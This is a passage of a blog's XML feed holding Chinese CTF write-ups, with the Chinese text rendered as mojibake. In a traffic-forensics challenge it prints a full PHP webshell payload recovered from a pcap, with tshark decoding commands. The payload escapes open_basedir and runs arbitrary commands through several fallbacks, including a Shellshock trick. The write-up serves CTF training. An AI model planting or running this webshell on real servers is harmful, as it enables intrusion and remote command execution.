src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804184954018.png" alt="image-20220804184954018"></p><p>å¾—åˆ°fusernameä¸ºhm688</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> ç¬¬å…­å±Šè“å¸½æ¯å…¨å›½å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›åŠå†³èµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬å…­å±Šå¼ºç½‘æ¯å…¨å›½ç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ›</title>
      <link href="/2022/07/31/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B/"/>
      <url>/2022/07/31/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h3 id="Bybyweb"><a href="#Bybyweb" class="headerlink" title="Bybyweb"></a>Bybyweb</h3><p>websocket(CSRF) -&gt; Pythonå‚æ•°æ±¡æŸ“&#x2F;go(è§£æä¸åŒ)</p><h3 id="rcefile"><a href="#rcefile" class="headerlink" title="rcefile"></a>rcefile</h3><p>æ–‡ä»¶ä¸Šä¼ phar</p><p><code>www.zip</code>-&gt; spl_autoload() -&gt; <code>.inc</code>æ–‡ä»¶ -&gt; åºåˆ—åŒ–å­—ç¬¦ä¸²</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> ç¬¬å…­å±Šå¼ºç½‘æ¯å…¨å›½ç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬å…­å±Šè“å¸½æ¯å…¨å›½å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›åˆèµ›Writeup</title>
      <link href="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/"/>
      <url>/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ç¬¬å…­å±Šâ€è“å¸½æ¯â€œå…¨å›½å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ› Writeups By ACT Team. 2022.7.9</p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="1-domainhacker"><a href="#1-domainhacker" class="headerlink" title="1. domainhacker"></a>1. domainhacker</h3><p>æ‰“å¼€æ•°æ®åŒ…ï¼Œåˆ†æhttpæµé‡ï¼Œå‘ç°å¤§é©¬ï¼ˆshellè¿æ¥ç®¡ç†å·¥å…·ï¼‰</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709195754404.png" alt="image-20220709195754404"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$opdir</span>=@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;open_basedir&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$opdir</span>) &#123;</span><br><span class="line"><span class="variable">$ocwd</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line"><span class="variable">$oparr</span>=<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/;|:/&quot;</span>,<span class="variable">$opdir</span>);</span><br><span class="line">@<span class="title function_ invoke__">array_push</span>(<span class="variable">$oparr</span>,<span class="variable">$ocwd</span>,<span class="title function_ invoke__">sys_get_temp_dir</span>());</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(!@<span class="title function_ invoke__">is_writable</span>(<span class="variable">$item</span>)) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="variable">$tmdir</span>=<span class="variable">$item</span>.<span class="string">&quot;/.c46a89a&quot;</span>;</span><br><span class="line">@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line"><span class="keyword">if</span>(!@<span class="title function_ invoke__">file_exists</span>(<span class="variable">$tmdir</span>)) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">chdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>);</span><br><span class="line"><span class="variable">$cntarr</span>=@<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/\\\\|\//&quot;</span>,<span class="variable">$tmdir</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">sizeof</span>(<span class="variable">$cntarr</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">@<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;/&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">rmdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable">$output</span>=<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;79c2&quot;</span>.<span class="string">&quot;0b92&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;b4e7e&quot;</span>.<span class="string">&quot;465b62&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="variable">$p</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;yee092cda97a62&quot;</span>],<span class="number">2</span>));</span><br><span class="line"><span class="variable">$s</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;q8fb9d4c082c11&quot;</span>],<span class="number">2</span>));</span><br><span class="line"><span class="variable">$envstr</span>=@<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;p48a6d55fac1b1&quot;</span>],<span class="number">2</span>));</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>?<span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>:<span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">@<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PATH=&quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">@<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PATH=&quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$envstr</span>)) &#123;</span><br><span class="line"><span class="variable">$envarr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">putenv</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$r</span>=<span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;,&quot;</span>,@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;disable_functions&quot;</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$d</span>)) &#123;</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">array</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;trim&#x27;</span>,<span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;strtolower&#x27;</span>,<span class="variable">$d</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>(<span class="title function_ invoke__">function_exists</span>(<span class="variable">$f</span>)&amp;&amp;<span class="title function_ invoke__">is_callable</span>(<span class="variable">$f</span>)&amp;&amp;!<span class="title function_ invoke__">in_array</span>(<span class="variable">$f</span>,<span class="variable">$d</span>));</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; <span class="title function_ invoke__">fe</span>(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;error_log&#x27;</span>) || <span class="title function_ invoke__">fe</span>(<span class="string">&#x27;mail&#x27;</span>))) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="title function_ invoke__">readlink</span>(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;</span><br><span class="line"><span class="variable">$tmp</span> = <span class="title function_ invoke__">tempnam</span>(<span class="title function_ invoke__">sys_get_temp_dir</span>(), <span class="string">&#x27;as&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;error_log&#x27;</span>)) &#123;</span><br><span class="line"><span class="title function_ invoke__">error_log</span>(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> False;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$output</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">return</span> True;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> False;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$ret</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">system</span>(<span class="variable">$c</span>,<span class="variable">$ret</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>,<span class="variable">$ret</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line"><span class="keyword">print</span>(@<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>));</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>,<span class="variable">$o</span>,<span class="variable">$ret</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">join</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>,<span class="variable">$o</span>));</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;popen&#x27;</span>)) &#123;</span><br><span class="line"><span class="variable">$fp</span>=@<span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line"><span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>,<span class="number">2048</span>));</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;proc_open&#x27;</span>)) &#123;</span><br><span class="line"><span class="variable">$p</span> = @<span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);</span><br><span class="line"><span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$io</span>[<span class="number">1</span>])) &#123;</span><br><span class="line"><span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$io</span>[<span class="number">1</span>],<span class="number">2048</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$io</span>[<span class="number">2</span>])) &#123;</span><br><span class="line"><span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$io</span>[<span class="number">2</span>],<span class="number">2048</span>));</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">fclose</span>(<span class="variable">$io</span>[<span class="number">1</span>]);</span><br><span class="line">@<span class="title function_ invoke__">fclose</span>(<span class="variable">$io</span>[<span class="number">2</span>]);</span><br><span class="line">@<span class="title function_ invoke__">proc_close</span>(<span class="variable">$p</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;antsystem&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">antsystem</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">runshellshock</span>(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span> &amp;&amp; @<span class="title function_ invoke__">class_exists</span>(<span class="string">&quot;COM&quot;</span>)) &#123;</span><br><span class="line"><span class="variable">$w</span>=<span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="line"><span class="variable">$e</span>=<span class="variable">$w</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$so</span>=<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">StdOut</span>();</span><br><span class="line"><span class="variable">$ret</span>.=<span class="variable">$so</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();</span><br><span class="line"><span class="variable">$se</span>=<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">StdErr</span>();</span><br><span class="line"><span class="variable">$ret</span>.=<span class="variable">$se</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="number">127</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="variable">$ret</span>=@<span class="title function_ invoke__">runcmd</span>(<span class="variable">$r</span>.<span class="string">&quot; 2&gt;&amp;1&quot;</span>);</span><br><span class="line"><span class="keyword">print</span> (<span class="variable">$ret</span>!=<span class="number">0</span>)?<span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span>:<span class="string">&quot;&quot;</span>;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="title function_ invoke__">asoutput</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;yee092cda97a62&quot;</span>],<span class="number">2</span>));</span><br><span class="line"><span class="variable">$s</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;q8fb9d4c082c11&quot;</span>],<span class="number">2</span>));</span><br><span class="line"><span class="variable">$envstr</span>=@<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;p48a6d55fac1b1&quot;</span>],<span class="number">2</span>));</span><br></pre></td></tr></table></figure><p>åˆ†æä»£ç å¯çŸ¥ï¼Œbase64æˆªå–ä¸¤ä½åå­—ç¬¦è¿›è¡Œè§£ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tshark -r domainhacker.pcapng -Y <span class="string">&#x27;http.request.method ==&quot;POST&quot;&#x27;</span> -T json -e urlencoded-form.value &gt; Tao.txt</span><br><span class="line"><span class="built_in">cat</span> Tao.txt | jq <span class="string">&#x27;.[]._source.layers.&quot;urlencoded-form.value&quot;[2]&#x27;</span> | <span class="built_in">cut</span> -d <span class="string">&#x27;&quot;&#x27;</span> -f 2 | sed <span class="string">&#x27;s/..//&#x27;</span> | <span class="built_in">base64</span> -d</span><br></pre></td></tr></table></figure><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709203001224.png" alt="image-20220709203001224"></p><p>å‘ç°1.rarå’Œä¸€ä¸ªå¯†ç ï¼Œæ­£å¥½å’Œå‰é¢è¯·æ±‚ä¸‹è½½å‹ç¼©åŒ…å¯¹åº”äº†ï¼Œå¯¼å‡ºhttpå¯¹è±¡</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709203759107.png" alt="image-20220709203759107"></p><p>å¯¼å‡ºå‘ç°<code>1.rar</code>ï¼Œè¾“å…¥ä¸Šé¢å‹ç¼©çš„å¯†ç å³å¯è§£å‹ç¼©è·å¾—flag</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709203846543.png" alt="image-20220709203846543"></p><h2 id="ç”µå­å–è¯"><a href="#ç”µå­å–è¯" class="headerlink" title="ç”µå­å–è¯"></a>ç”µå­å–è¯</h2><h3 id="1-æ‰‹æœºå–è¯1"><a href="#1-æ‰‹æœºå–è¯1" class="headerlink" title="1. æ‰‹æœºå–è¯1"></a>1. æ‰‹æœºå–è¯1</h3><p>æœç´¢<code>3022159.PNG</code></p><p><img 